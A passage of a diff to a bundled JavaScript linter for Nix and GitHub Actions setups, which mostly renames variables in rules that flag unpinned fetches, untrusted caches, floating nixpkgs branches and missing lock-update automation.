-  const prefix = string3.interpolated ? string3.value.slice(0, string3.value.indexOf("${")) : string3.value;
-  return REMOTE.test(prefix) ? string3.value : void 0;
+function remoteUrl(string4) {
+  if (!string4) return void 0;
+  const prefix = string4.interpolated ? string4.value.slice(0, string4.value.indexOf("${")) : string4.value;
+  return REMOTE.test(prefix) ? string4.value : void 0;
 }
 function unlocked(file, arg) {
   const shown = snippet(file, arg.start, arg.end);
@@ -22600,15 +22600,15 @@ function unlocked(file, arg) {
     const url2 = remoteUrl(literal4);
     return url2 ? { url: url2, shown } : void 0;
   }
-  const open3 = attrsetOf(file, unwrapParens(file, arg));
-  if (open3 === void 0) return void 0;
-  const keys = attrKeys(file, open3);
+  const open4 = attrsetOf(file, unwrapParens(file, arg));
+  if (open4 === void 0) return void 0;
+  const keys = attrKeys(file, open4);
   if (keys.has("rev") || keys.has("narHash")) return void 0;
-  if (nixBindings(file, open3).some((binding2) => binding2.path[0] === "${}")) return void 0;
-  const urlBinding = bindingNamed(file, open3, "url");
+  if (nixBindings(file, open4).some((binding2) => binding2.path[0] === "${}")) return void 0;
+  const urlBinding = bindingNamed(file, open4, "url");
   const url = urlBinding ? remoteUrl(stringAt2(file, urlBinding.valueStart)) : void 0;
   if (!url) return void 0;
-  const refBinding = bindingNamed(file, open3, "ref");
+  const refBinding = bindingNamed(file, open4, "ref");
   const ref = refBinding ? stringAt2(file, refBinding.valueStart) : void 0;
   return { url, ...ref && !ref.interpolated ? { ref: ref.value } : {}, shown };
 }
@@ -22648,7 +22648,7 @@ var fetchgit_missing_rev_default = defineRule({
         if (!finding3) continue;
         count += 1;
         const target = finding3.ref ? `the current tip of \`${finding3.ref}\`, a mutable ref` : "whatever the remote's `HEAD` points to right now";
-        const branch = finding3.ref ?? "<branch>";
+        const branch2 = finding3.ref ?? "<branch>";
         const url = finding3.url.includes("${") ? "<url>" : finding3.url;
         report({
           path: file.path,
@@ -22657,8 +22657,8 @@ var fetchgit_missing_rev_default = defineRule({
           suggestion: [
             `${ident.text} {`,
             `  url = "${finding3.url}";`,
-            `  ref = "${branch}";`,
-            `  rev = "<40-character commit from: git ls-remote ${url} ${branch.startsWith("refs/") ? branch : `refs/heads/${branch}`}>";`,
+            `  ref = "${branch2}";`,
+            `  rev = "<40-character commit from: git ls-remote ${url} ${branch2.startsWith("refs/") ? branch2 : `refs/heads/${branch2}`}>";`,
             "}",
             "",
             'Add `allRefs = true;` if the commit is not reachable from `ref`. Alternatively declare a flake input (`inputs.<name> = { url = "git+https://..."; flake = false; };`) so flake.lock records the revision.'
@@ -22678,12 +22678,12 @@ var CHANNEL = /^https:\/\/(?:channels|nixos)\.nixos\.org\/|^channel:/;
 function unpinned(file, arg) {
   const literal4 = leadingString(file, arg);
   if (literal4) return { url: literal4, shown: snippet(file, arg.start, arg.end) };
-  const open3 = attrsetOf(file, unwrapParens(file, arg));
-  if (open3 === void 0) return void 0;
-  const keys = attrKeys(file, open3);
+  const open4 = attrsetOf(file, unwrapParens(file, arg));
+  if (open4 === void 0) return void 0;
+  const keys = attrKeys(file, open4);
   if (keys.has("sha256") || keys.has("hash")) return void 0;
-  if (nixBindings(file, open3).some((binding2) => binding2.path[0] === "${}")) return void 0;
-  const urlBinding = bindingNamed(file, open3, "url");
+  if (nixBindings(file, open4).some((binding2) => binding2.path[0] === "${}")) return void 0;
+  const urlBinding = bindingNamed(file, open4, "url");
   const url = urlBinding ? stringAt2(file, urlBinding.valueStart) : void 0;
   return { ...url ? { url } : {}, shown: snippet(file, arg.start, arg.end) };
 }
@@ -22760,11 +22760,11 @@ import { posix as posix3 } from "node:path";
 // src/lint/rules/toolchains/shared.ts
 var import_yaml12 = __toESM(require_dist(), 1);
 function context(project, workflow, job) {
-  const entries2 = expandedJobSteps(project, workflow, job);
-  const commands = entries2.flatMap(
+  const entries3 = expandedJobSteps(project, workflow, job);
+  const commands = entries3.flatMap(
     (entry2) => commandsOf(entry2.step).map(({ command, line }) => ({ ...entry2, command, line }))
   );
-  return { workflow, job, entries: entries2, commands };
+  return { workflow, job, entries: entries3, commands };
 }
 function jobContexts(project) {
   const result = [];
@@ -22994,37 +22994,37 @@ function parseProperties(content2) {
   const lines = content2.split("\n").map((line) => line.replace(/\r$/, ""));
   for (let index = 0; index < lines.length; index += 1) {
     const startLine = index + 1;
-    let text6 = (lines[index] ?? "").replace(/^\s+/, "");
-    if (text6 === "" || text6.startsWith("#") || text6.startsWith("!")) continue;
-    while (/(?:^|[^\\])(?:\\\\)*\\$/.test(text6) && index + 1 < lines.length) {
+    let text7 = (lines[index] ?? "").replace(/^\s+/, "");
+    if (text7 === "" || text7.startsWith("#") || text7.startsWith("!")) continue;
+    while (/(?:^|[^\\])(?:\\\\)*\\$/.test(text7) && index + 1 < lines.length) {
       index += 1;
-      text6 = text6.slice(0, -1) + (lines[index] ?? "").replace(/^\s+/, "");
+      text7 = text7.slice(0, -1) + (lines[index] ?? "").replace(/^\s+/, "");
     }
-    const match2 = /^((?:\\.|[^=:\s\\])*)\s*[=:]?\s*(.*)$/.exec(text6);
+    const match2 = /^((?:\\.|[^=:\s\\])*)\s*[=:]?\s*(.*)$/.exec(text7);
     if (!match2) continue;
     result.set((match2[1] ?? "").replace(/\\(.)/g, "$1"), { value: (match2[2] ?? "").trim(), line: startLine });
   }
   return result;
 }
-function escapeRegExp2(text6) {
-  return text6.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+function escapeRegExp2(text7) {
+  return text7.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 }
-function withInserted(raw, list3, prefix, text6) {
+function withInserted(raw, list3, prefix, text7) {
   const all = shellTokens(raw);
   const command = commandTokens(raw);
   if (prefix.length === 0 || !prefix.every((word, index) => command[index]?.value === word) || command.length !== list3.length) {
-    return `# Add ${text6.trim()} after checking the tool's argument boundaries:
+    return `# Add ${text7.trim()} after checking the tool's argument boundaries:
 ${raw}`;
   }
   const count = all.length - command.length + prefix.length;
   let end = 0;
   for (const token of all.slice(0, count)) {
     const start2 = raw.indexOf(token.raw, end);
-    if (start2 < 0) return `# Add ${text6.trim()} after checking the tool's argument boundaries:
+    if (start2 < 0) return `# Add ${text7.trim()} after checking the tool's argument boundaries:
 ${raw}`;
     end = start2 + token.raw.length;
   }
-  return `${raw.slice(0, end)}${text6}${raw.slice(end)}`;
+  return `${raw.slice(0, end)}${text7}${raw.slice(end)}`;
 }
 function withReplacedToken(raw, index, replacement3) {
   const all = shellTokens(raw);
@@ -23087,10 +23087,10 @@ function pathAfter(file, start2) {
       segments.push("${}");
       index = close2 + 1;
     } else if (char === '"') {
-      const string3 = file.strings.find((entry2) => entry2.start === index);
-      if (!string3) return void 0;
-      segments.push(string3.interpolated ? "${}" : string3.value);
-      index = string3.end;
+      const string4 = file.strings.find((entry2) => entry2.start === index);
+      if (!string4) return void 0;
+      segments.push(string4.interpolated ? "${}" : string4.value);
+      index = string4.end;
     } else {
       IDENT.lastIndex = index;
       const word = IDENT.exec(masked)?.[0];
@@ -23110,10 +23110,10 @@ function atBindingStart(masked, index) {
   if (char === "{" || char === ";") return true;
   return masked.slice(Math.max(0, cursor - 2), cursor + 1) === "let" && !/[\w'-]/.test(masked[cursor - 3] ?? "");
 }
-function inheritedNames(masked, open3, close2) {
+function inheritedNames(masked, open4, close2) {
   const names = [];
   let depth = 0;
-  for (let index = open3 + 1; index < close2; index += 1) {
+  for (let index = open4 + 1; index < close2; index += 1) {
     const char = masked[index] ?? "";
     if (char === "{" || char === "(" || char === "[") depth += 1;
     else if (char === "}" || char === ")" || char === "]") depth -= 1;
@@ -23131,22 +23131,22 @@ function inheritedNames(masked, open3, close2) {
 }
 function valueNames(file, valueStart, valueEnd) {
   const { masked } = file;
-  let open3 = -1;
+  let open4 = -1;
   const literal4 = /^(?:rec\s+)?\{/.exec(masked.slice(valueStart, valueStart + 8));
-  if (literal4) open3 = valueStart + literal4[0].length - 1;
+  if (literal4) open4 = valueStart + literal4[0].length - 1;
   else {
     let cursor = valueEnd - 1;
     while (cursor > valueStart && /[\s)]/.test(masked[cursor] ?? "")) cursor -= 1;
-    if (masked[cursor] === "}") open3 = matchingOpen(masked, cursor);
-    let before = open3 - 1;
+    if (masked[cursor] === "}") open4 = matchingOpen(masked, cursor);
+    let before = open4 - 1;
     while (before > valueStart && /\s/.test(masked[before] ?? "")) before -= 1;
     const lambdaBody = masked[before] === ":" || masked.slice(before - 1, before + 1) === "in" && !/[\w'-]/.test(masked[before - 2] ?? "");
     if (!lambdaBody) return [];
   }
-  if (open3 < valueStart || masked[open3 - 1] === "$") return [];
-  const close2 = matchingClose(masked, open3);
-  const names = inheritedNames(masked, open3, close2);
-  for (const binding2 of nixBindings(file, open3)) {
+  if (open4 < valueStart || masked[open4 - 1] === "$") return [];
+  const close2 = matchingClose(masked, open4);
+  const names = inheritedNames(masked, open4, close2);
+  for (const binding2 of nixBindings(file, open4)) {
     const name = binding2.path.find((segment) => !SYSTEM.test(segment));
     if (name) names.push(name);
   }
@@ -23440,7 +23440,7 @@ function jobView(model, site, nix) {
     else if (name) cachixNames.add(name.toLowerCase());
   };
   let flakehub = false;
-  const text6 = [];
+  const text7 = [];
   for (const { step, owner } of steps2) {
     if ((step.if || owner.if) && usesAction(step, "cachix/cachix-action", "determinatesystems/flakehub-cache-action", "determinatesystems/magic-nix-cache-action")) return void 0;
     if (usesAction(step, "cachix/cachix-action") && String(step.with.get("skipAddingSubstituter")?.value ?? "").trim() !== "true") {
@@ -23450,22 +23450,22 @@ function jobView(model, site, nix) {
     }
     if (usesAction(step, "determinatesystems/flakehub-cache-action", "determinatesystems/magic-nix-cache-action")) flakehub = true;
     const confInputs = NIX_CONF_INPUTS[step.uses?.action.name ?? ""] ?? [];
-    for (const [name, value2] of step.with) if (!confInputs.includes(name)) text6.push(String(value2.value));
-    for (const [name, value2] of Object.entries(step.env)) if (name !== "NIX_CONFIG") text6.push(String(value2));
+    for (const [name, value2] of step.with) if (!confInputs.includes(name)) text7.push(String(value2.value));
+    for (const [name, value2] of Object.entries(step.env)) if (name !== "NIX_CONFIG") text7.push(String(value2));
   }
-  for (const env of [workflow.env, job.env]) for (const [name, value2] of Object.entries(env)) if (name !== "NIX_CONFIG") text6.push(String(value2));
+  for (const env of [workflow.env, job.env]) for (const [name, value2] of Object.entries(env)) if (name !== "NIX_CONFIG") text7.push(String(value2));
   for (const entry2 of model.commands) {
     if (entry2 === site || entry2.step === site.step && entry2.owner === site.owner && site.command === "") break;
     const index = model.entries.findIndex((candidate) => candidate.step === entry2.step && candidate.owner === entry2.owner);
     if (index > position) break;
     if (stepIsSkipped(entry2)) continue;
     for (const match2 of entry2.command.matchAll(/\bcachix\s+use\s+(?:-\S+\s+)*([^\s;&|]+)/g)) addCachix(match2[1] ?? "");
-    text6.push(entry2.command);
+    text7.push(entry2.command);
   }
   const cwd = site.command === "" ? stepCwd(site, model) : commandDirectory(model, site);
   if (cwd === void 0) return void 0;
   const targets = flakeTargets(nix, cwd).map((dir) => ({ dir, path: site.path, line: site.line, display: display(nix) }));
-  return { model, installer: installer.step, substituters, trusted, cachixNames, anyCachix, flakehub, text: text6.join("\n").toLowerCase(), targets };
+  return { model, installer: installer.step, substituters, trusted, cachixNames, anyCachix, flakehub, text: text7.join("\n").toLowerCase(), targets };
 }
 function covers(view2, url) {
   if (view2.trusted || view2.substituters.has(url.norm)) return true;
@@ -23476,8 +23476,8 @@ function covers(view2, url) {
   if (host === "cache.flakehub.com" && view2.flakehub) return true;
   return view2.text.includes(host);
 }
-function code(text6) {
-  return `\`${text6}\``;
+function code(text7) {
+  return `\`${text7}\``;
 }
 var flake_nixconfig_cache_not_trusted_default = defineRule({
   meta: {
@@ -23619,10 +23619,10 @@ function onlyLocalInputs(update2, inputs) {
   return update2.inputs.length > 0 && update2.inputs.every((name) => /^(?:path:|\.{1,2}\/|\/)/.test(inputs.get(name) ?? ""));
 }
 function limitedToUpdateEvents(condition) {
-  const expression = (condition ?? "").trim().replace(/^\$\{\{\s*|\s*\}\}$/g, "");
-  if (expression === "false") return true;
-  if (expression.includes("||")) return false;
-  return expression.split("&&").some((atom) => {
+  const expression2 = (condition ?? "").trim().replace(/^\$\{\{\s*|\s*\}\}$/g, "");
+  if (expression2 === "false") return true;
+  if (expression2.includes("||")) return false;
+  return expression2.split("&&").some((atom) => {
     const event = /^\s*\(?\s*github\.event_name\s*==\s*['"]([\w-]+)['"]\s*\)?\s*$/.exec(atom)?.[1];
     return event !== void 0 && !BUILD_TRIGGERS.includes(event);
   });
@@ -23829,7 +23829,7 @@ var git_input_for_github_default = defineRule({
         const caveats = [
           ssh ? "Over SSH this input is probably private: `github:` authenticates with a token instead of an SSH key, so give Nix one with `access-tokens = github.com=<token>` (cachix/install-nix-action's `github_access_token` input); the default `GITHUB_TOKEN` only reaches the workflow's own repository." : "If the repository is private, Nix needs `access-tokens = github.com=<token>` (cachix/install-nix-action's `github_access_token` input) to download it.",
           usesRevCount ? "flake.nix reads `revCount`, which `github:` inputs do not provide; make sure it is not read from this input." : void 0
-        ].filter((text6) => text6 !== void 0);
+        ].filter((text7) => text7 !== void 0);
         report({
           path: file.path,
           line: input2.urlLine,
@@ -23928,10 +23928,10 @@ function floatingForgeRef(ref) {
   if (!match2?.[1] || ref.includes("$")) return void 0;
   const params = new URLSearchParams(match2[3] ?? "");
   if (params.has("rev") || params.has("narHash")) return void 0;
-  const branch = match2[2] ?? params.get("ref") ?? void 0;
-  if (branch === void 0) return { reason: `the default branch of ${match2[1]}`, indirect: false };
-  if (!FORGE_BRANCH.test(branch)) return void 0;
-  return { reason: `the ${branch} branch of ${match2[1]}`, indirect: false };
+  const branch2 = match2[2] ?? params.get("ref") ?? void 0;
+  if (branch2 === void 0) return { reason: `the default branch of ${match2[1]}`, indirect: false };
+  if (!FORGE_BRANCH.test(branch2)) return void 0;
+  return { reason: `the ${branch2} branch of ${match2[1]}`, indirect: false };
 }
 function pinnedForgeRef(ref) {
   const match2 = FORGE_REF.exec(ref);
@@ -24130,9 +24130,9 @@ function producerAt(file, offset, fromBuiltins, depth) {
 function producerOf(file, arg, fromBuiltins) {
   const unwrapped = unwrapParens(file, arg);
   if (unwrapped.kind === "string") {
-    const string3 = stringAt2(file, unwrapped.start);
-    if (!string3?.interpolated) return void 0;
-    const body = string3.start + (string3.indented ? 2 : 1);
+    const string4 = stringAt2(file, unwrapped.start);
+    if (!string4?.interpolated) return void 0;
+    const body = string4.start + (string4.indented ? 2 : 1);
     if (file.content.slice(body, body + 2) !== "${") return void 0;
     return producerAt(file, body + 2, fromBuiltins, 0);
   }
@@ -24141,15 +24141,15 @@ function producerOf(file, arg, fromBuiltins) {
   return void 0;
 }
 function consumerKind(file, ident, fromBuiltins) {
-  const { text: text6, segments } = ident;
+  const { text: text7, segments } = ident;
   const last = segments.at(-1) ?? "";
   let kind;
-  if (text6 === "import" || text6 === "builtins.import" || last === "callPackage") kind = "import";
+  if (text7 === "import" || text7 === "builtins.import" || last === "callPackage") kind = "import";
   else if (segments.length === 2 && segments[0] === "builtins" && BUILTIN_READERS.has(last)) kind = "read";
   else if (segments.length === 1 && BUILTIN_READERS.has(last) && fromBuiltins.has(last)) kind = "read";
   else if (segments.length >= 2 && segments.includes("lib") && LIB_READERS.has(last)) kind = "read";
   else return void 0;
-  if (segments.length === 1 && isShadowed(file, text6)) return void 0;
+  if (segments.length === 1 && isShadowed(file, text7)) return void 0;
   if (segments[0] === "builtins" && isShadowed(file, "builtins")) return void 0;
   return kind;
 }
@@ -24210,8 +24210,8 @@ function helperFindings(file) {
     const qualified = qualifiedName(file, offset, "developPackage");
     if (!/haskell/i.test(qualified) || isShadowed(file, "developPackage")) continue;
     const arg = wordCall(file, offset, "developPackage");
-    const open3 = arg ? attrsetOf(file, arg) : void 0;
-    if (open3 === void 0 || !attrKeys(file, open3).has("root")) continue;
+    const open4 = arg ? attrsetOf(file, arg) : void 0;
+    if (open4 === void 0 || !attrKeys(file, open4).has("root")) continue;
     findings4.push({
       offset,
       line: file.lineOf(offset),
@@ -24237,9 +24237,9 @@ function helperFindings(file) {
     for (const offset of wordOffsets(file, name)) {
       if (isShadowed(file, name)) continue;
       const arg = wordCall(file, offset, name);
-      const open3 = arg ? attrsetOf(file, arg) : void 0;
-      if (open3 === void 0) continue;
-      const keys = attrKeys(file, open3);
+      const open4 = arg ? attrsetOf(file, arg) : void 0;
+      if (open4 === void 0) continue;
+      const keys = attrKeys(file, open4);
       if (keys.has("offlineCache") || keys.has("yarnNix")) continue;
       findings4.push({
         offset,
@@ -24255,11 +24255,11 @@ function helperFindings(file) {
     if (file.masked[offset - 1] === "." || !isBindingKey(file.masked, offset, "autoPubspecLock".length)) continue;
     const value2 = skipSpace2(file.masked, skipSpace2(file.masked, offset + "autoPubspecLock".length) + 1);
     if (/^(?:true|false|null)\b/.test(file.masked.slice(value2))) continue;
-    const open3 = enclosingOpen(file, offset);
+    const open4 = enclosingOpen(file, offset);
     const builder = file.idents.some((ident) => {
       if (!["buildDartApplication", "buildFlutterApplication"].includes(ident.segments.at(-1) ?? "")) return false;
       const arg = callArgument(file, ident);
-      return arg !== void 0 && attrsetOf(file, arg) === open3;
+      return arg !== void 0 && attrsetOf(file, arg) === open4;
     });
     if (!builder) continue;
     findings4.push({
@@ -24660,8 +24660,8 @@ function blockLines(content2, anchor) {
   const indent = /^\s*/.exec(lines[anchor - 1] ?? "")?.[0].length ?? 0;
   const block2 = [];
   for (let index = anchor; index < lines.length; index += 1) {
-    const text6 = lines[index] ?? "";
-    if (text6.trim() !== "" && (/^\s*/.exec(text6)?.[0].length ?? 0) <= indent) break;
+    const text7 = lines[index] ?? "";
+    if (text7.trim() !== "" && (/^\s*/.exec(text7)?.[0].length ?? 0) <= indent) break;
     block2.push(index + 1);
   }
   return block2;
@@ -24820,8 +24820,8 @@ function configuresSandbox(instructions) {
     return false;
   });
 }
-function display2(text6) {
-  const flat = text6.replace(/\\\r?\n/g, " ").replace(/\s+/g, " ").trim();
+function display2(text7) {
+  const flat = text7.replace(/\\\r?\n/g, " ").replace(/\s+/g, " ").trim();
   return flat.length > 80 ? `${flat.slice(0, 77)}...` : flat;
 }
 var nix_build_inside_docker_default = defineRule({
@@ -25049,10 +25049,10 @@ var nixpkgs_angle_bracket_path_default = defineRule({
 var FULL_REV = /^[0-9a-f]{40}$/i;
 var NIXPKGS_TARBALL = /^(?:tarball\+)?https:\/\/(?:www\.)?github\.com\/nixos\/nixpkgs\/(?:archive|tarball)\/(.+?)(?:\.tar\.gz|\.zip)?$/i;
 function branchOf(ref) {
-  const branch = ref?.replace(/^refs\/heads\//, "");
-  if (branch === void 0 || branch === "") return {};
-  if (FULL_REV.test(branch) || NIXPKGS_CHANNEL.test(branch) || !NIXPKGS_DEV_BRANCH.test(branch)) return void 0;
-  return { branch };
+  const branch2 = ref?.replace(/^refs\/heads\//, "");
+  if (branch2 === void 0 || branch2 === "") return {};
+  if (FULL_REV.test(branch2) || NIXPKGS_CHANNEL.test(branch2) || !NIXPKGS_DEV_BRANCH.test(branch2)) return void 0;
+  return { branch: branch2 };
 }
 function declaredBranch(input2) {
   const tarball = input2.url !== void 0 ? NIXPKGS_TARBALL.exec(input2.url) : null;
@@ -25067,15 +25067,15 @@ function lockedBranch(node) {
   if (str(original.owner)?.toLowerCase() !== "nixos" || str(original.repo)?.toLowerCase() !== "nixpkgs") return void 0;
   return branchOf(str(original.ref));
 }
-function replacement2(branch) {
-  const release2 = branch !== void 0 ? /^release-(\d{2}\.\d{2})$/.exec(branch)?.[1] : void 0;
+function replacement2(branch2) {
+  const release2 = branch2 !== void 0 ? /^release-(\d{2}\.\d{2})$/.exec(branch2)?.[1] : void 0;
   return release2 ? `nixos-${release2}` : "nixos-unstable";
 }
-function describe6(branch) {
-  return branch === void 0 ? "the default branch (`master`)" : `\`${branch}\``;
+function describe6(branch2) {
+  return branch2 === void 0 ? "the default branch (`master`)" : `\`${branch2}\``;
 }
-function suggestion2(name, branch) {
-  const channel = replacement2(branch);
+function suggestion2(name, branch2) {
+  const channel = replacement2(branch2);
   const darwin = channel === "nixos-unstable" ? "nixpkgs-unstable" : `nixpkgs-${channel.slice("nixos-".length)}-darwin`;
   return [
     `If compatible with the project's dependency policy, consider a channel branch gated by its release jobset, then re-lock and test the input. This changes dependency selection, not just performance:`,
@@ -25313,10 +25313,10 @@ var no_lock_update_automation_default = defineRule({
     );
     const subject = uncovered.length === 1 ? `\`${first.path}\` pins ${first.inputs} ${first.inputs === 1 ? "input" : "inputs"}${first.oldest ? ` (oldest pinned commit: \`${first.oldest.name}\` from ${first.oldest.date})` : ""}` : `${uncovered.length} lock files (${uncovered.map((lock) => `\`${lock.path}\``).join(", ")})`;
     const dirs = uncovered.map((lock) => `/${lock.dir}`);
-    const location2 = dirs.length === 1 ? `    directory: "${dirs[0]}"` : `    directories:
+    const location3 = dirs.length === 1 ? `    directory: "${dirs[0]}"` : `    directories:
 ${dirs.map((dir) => `      - "${dir}"`).join("\n")}`;
     const entry2 = `  - package-ecosystem: "nix"
-${location2}
+${location3}
     schedule:
       interval: "weekly"`;
     const snippet2 = dependabot && /^updates\s*:/m.test(dependabot.content) ? entry2 : `version: 2
@@ -25396,14 +25396,14 @@ function dependabotNixCoverage(content2) {
   if (updates === void 0) return { entries: false, patterns: [] };
   if (!Array.isArray(updates)) return "unknown";
   const patterns = [];
-  let entries2 = false;
+  let entries3 = false;
   for (const update2 of updates) {
     if (typeof update2 !== "object" || update2 === null) continue;
     const fields = update2;
     const ecosystem = fields["package-ecosystem"];
     if (typeof ecosystem !== "string") return "unknown";
     if (ecosystem !== "nix") continue;
-    entries2 = true;
+    entries3 = true;
     const dirs = [fields.directory, ...Array.isArray(fields.directories) ? fields.directories : [fields.directories]].filter(
       (dir) => dir !== void 0
     );
@@ -25414,7 +25414,7 @@ function dependabotNixCoverage(content2) {
       patterns.push(pattern);
     }
   }
-  return { entries: entries2, patterns };
+  return { entries: entries3, patterns };
 }
 function directoryPattern(dir) {
   const trimmed = dir.trim().replace(/^\.?\/+/, "").replace(/\/+$/, "");
@@ -25439,11 +25439,11 @@ function renovateEnabled(files) {
     }
   }
   return configs.some(
-    (text6) => /["']?\bnix["']?\s*:\s*\{[^{}]*?["']?enabled["']?\s*:\s*true\b/.test(text6) || /["']?enabledManagers["']?\s*:\s*\[[^\]]*["']nix["']/.test(text6) || sharedPresets(text6)
+    (text7) => /["']?\bnix["']?\s*:\s*\{[^{}]*?["']?enabled["']?\s*:\s*true\b/.test(text7) || /["']?enabledManagers["']?\s*:\s*\[[^\]]*["']nix["']/.test(text7) || sharedPresets(text7)
   );
 }
-function sharedPresets(text6) {
-  const list3 = /["']?extends["']?\s*:\s*\[([^\]]*)\]/.exec(text6)?.[1];
+function sharedPresets(text7) {
+  const list3 = /["']?extends["']?\s*:\s*\[([^\]]*)\]/.exec(text7)?.[1];
   if (!list3) return false;
   return [...list3.matchAll(/["']([^"']+)["']/g)].some(([, preset = ""]) => {
     if (preset.includes(">") || preset.startsWith("@") || !preset.includes(":")) return true;
@@ -25508,23 +25508,23 @@ var BOOTSTRAP = /* @__PURE__ */ new Set(["glibc", "gcc", "binutils", "coreutils"
 var OVERLAY_LAMBDA = /(?<![A-Za-z0-9_'.-])(final|self|_final|_self|_)\s*:\s*(prev|super|_prev|_super|_)\s*:/g;
 var PACKAGE_SETS = /* @__PURE__ */ new Set(["prev", "super", "final", "self"]);
 var NON_OVERLAY_KEY = /^(?:packageOverrides|overrides|overrideScope'?|.*Extensions|.*Packages)$/;
-function callHead(masked, open3) {
-  return masked.slice(0, open3).match(/([A-Za-z_][A-Za-z0-9_'.-]*)\s*$/)?.[1];
+function callHead(masked, open4) {
+  return masked.slice(0, open4).match(/([A-Za-z_][A-Za-z0-9_'.-]*)\s*$/)?.[1];
 }
 function isOverlayContext(file, lambda) {
   const { masked } = file;
   const key2 = assignedKey(masked, lambda);
   if (key2 !== void 0 && NON_OVERLAY_KEY.test(key2)) return false;
   if (key2 !== void 0 && /overlay/i.test(key2)) return true;
-  const open3 = enclosingOpen(file, lambda);
-  if (open3 < 0) {
+  const open4 = enclosingOpen(file, lambda);
+  if (open4 < 0) {
     const before = previousNonSpace(masked, lambda);
     const topLevel = before < 0 || masked[before] === ":" || previousWord(masked, lambda) === "in";
     return topLevel && /overlay/i.test(file.path);
   }
-  if (masked[open3] === "(") {
-    if (/(?:^|\.)(?:extend|composeExtensions)$/.test(callHead(masked, open3) ?? "")) return true;
-    const list3 = enclosingOpen(file, open3);
+  if (masked[open4] === "(") {
+    if (/(?:^|\.)(?:extend|composeExtensions)$/.test(callHead(masked, open4) ?? "")) return true;
+    const list3 = enclosingOpen(file, open4);
     if (list3 >= 0 && masked[list3] === "[" && /(?:^|\.)(?:appendOverlays|composeManyExtensions)$/.test(callHead(masked, list3) ?? "")) return true;
   }
   const path = enclosingBindingPath(file, lambda);
@@ -25539,9 +25539,9 @@ function overlayBody(masked, afterLambda) {
   if (/^rec(?![A-Za-z0-9_'-])/.test(masked.slice(cursor))) cursor = skipSpace2(masked, cursor + 3);
   return masked[cursor] === "{" ? cursor : void 0;
 }
-function rebindings(file, open3, watched) {
+function rebindings(file, open4, watched) {
   const found = [];
-  for (const binding2 of nixBindings(file, open3)) {
+  for (const binding2 of nixBindings(file, open4)) {
     const name = binding2.path[0];
     if (binding2.path.length !== 1 || name === void 0 || !watched.has(name)) continue;
     const value2 = file.masked.slice(binding2.valueStart, binding2.valueEnd).trim().replace(/;$/, "").trim();
@@ -25550,7 +25550,7 @@ function rebindings(file, open3, watched) {
     found.push({ name, offset: binding2.keyStart, shown: `${name} = ${snippet(file, binding2.valueStart, binding2.valueEnd, 50).replace(/;$/, "")}` });
   }
   for (const statement2 of inheritStatements(file)) {
-    if (statement2.source === void 0 || PACKAGE_SETS.has(statement2.source) || enclosingOpen(file, statement2.offset) !== open3) continue;
+    if (statement2.source === void 0 || PACKAGE_SETS.has(statement2.source) || enclosingOpen(file, statement2.offset) !== open4) continue;
     for (const entry2 of statement2.names) {
       if (watched.has(entry2.name)) found.push({ name: entry2.name, offset: entry2.offset, shown: `inherit (${statement2.source}) ${entry2.name}` });
     }
@@ -25620,9 +25620,9 @@ var overlay_overrides_foundational_package_default = defineRule({
       const reported = /* @__PURE__ */ new Set();
       for (const match2 of file.masked.matchAll(OVERLAY_LAMBDA)) {
         if (!isOverlayContext(file, match2.index)) continue;
-        const open3 = overlayBody(file.masked, match2.index + match2[0].length);
-        if (open3 === void 0) continue;
-        const findings4 = rebindings(file, open3, watched).sort((a, b) => a.offset - b.offset);
+        const open4 = overlayBody(file.masked, match2.index + match2[0].length);
+        if (open4 === void 0) continue;
+        const findings4 = rebindings(file, open4, watched).sort((a, b) => a.offset - b.offset);
         for (const finding3 of findings4) {
           if (reported.has(finding3.offset)) continue;
           reported.add(finding3.offset);
@@ -25780,8 +25780,8 @@ function sourceHead(file, offset) {
 }
 function isLocalSource(file, start2, end) {
   const head = sourceHead(file, start2);
-  const text6 = file.masked.slice(head, end).trim();
-  if (isPathLiteral(text6)) return true;
+  const text7 = file.masked.slice(head, end).trim();
+  if (isPathLiteral(text7)) return true;
   const ident = headIdent(file, head);
   if (!ident) return false;
   const last = ident.segments.at(-1) ?? "";
@@ -25789,9 +25789,9 @@ function isLocalSource(file, start2, end) {
   if (ident.segments.includes("fileset") || LOCAL_SOURCE_HELPERS.has(last) || ident.text === "nix-gitignore.gitignoreSource" || ident.text === "builtins.path") {
     const argument = callArgument(file, ident);
     if (!argument) return false;
-    const open3 = attrsetOf(file, argument);
-    if (open3 !== void 0) {
-      const source = bindingNamed(file, open3, "src") ?? bindingNamed(file, open3, "root") ?? bindingNamed(file, open3, "path");
+    const open4 = attrsetOf(file, argument);
+    if (open4 !== void 0) {
+      const source = bindingNamed(file, open4, "src") ?? bindingNamed(file, open4, "root") ?? bindingNamed(file, open4, "path");
       return source !== void 0 && isLocalSource(file, source.valueStart, source.valueEnd);
     }
     return argument.start > ident.offset && isPathLiteral(file.masked.slice(argument.start, argument.end).trim());
@@ -25809,26 +25809,26 @@ function uniqueSrcBinding(file) {
   }
   return found.length === 1 ? found[0] : void 0;
 }
-function localSource(file, open3) {
-  const binding2 = bindingNamed(file, open3, "src");
+function localSource(file, open4) {
+  const binding2 = bindingNamed(file, open4, "src");
   if (binding2) {
     if (!isLocalSource(file, binding2.valueStart, binding2.valueEnd)) return void 0;
     return { text: snippet(file, binding2.valueStart, binding2.valueEnd, 50), line: binding2.line };
   }
   const inheritsSrc = inheritStatements(file).some(
-    (statement2) => statement2.source === void 0 && enclosingOpen(file, statement2.offset) === open3 && statement2.names.some(({ name }) => name === "src")
+    (statement2) => statement2.source === void 0 && enclosingOpen(file, statement2.offset) === open4 && statement2.names.some(({ name }) => name === "src")
   );
   if (!inheritsSrc) return void 0;
   const outer = uniqueSrcBinding(file);
-  if (!outer || outer.start > open3 || !isLocalSource(file, outer.start, outer.end)) return void 0;
+  if (!outer || outer.start > open4 || !isLocalSource(file, outer.start, outer.end)) return void 0;
   return { text: snippet(file, outer.start, outer.end, 50), line: file.lineOf(outer.start) };
 }
-function packageName2(file, open3) {
+function packageName2(file, open4) {
   for (const key2 of ["pname", "name"]) {
-    const binding2 = bindingNamed(file, open3, key2);
+    const binding2 = bindingNamed(file, open4, key2);
     if (!binding2) continue;
-    const string3 = stringAt2(file, binding2.valueStart);
-    if (string3 && !string3.interpolated) return string3.value;
+    const string4 = stringAt2(file, binding2.valueStart);
+    if (string4 && !string4.interpolated) return string4.value;
   }
   return void 0;
 }
@@ -25864,11 +25864,11 @@ var rust_two_phase_build_default = defineRule({
       for (const ident of file.idents) {
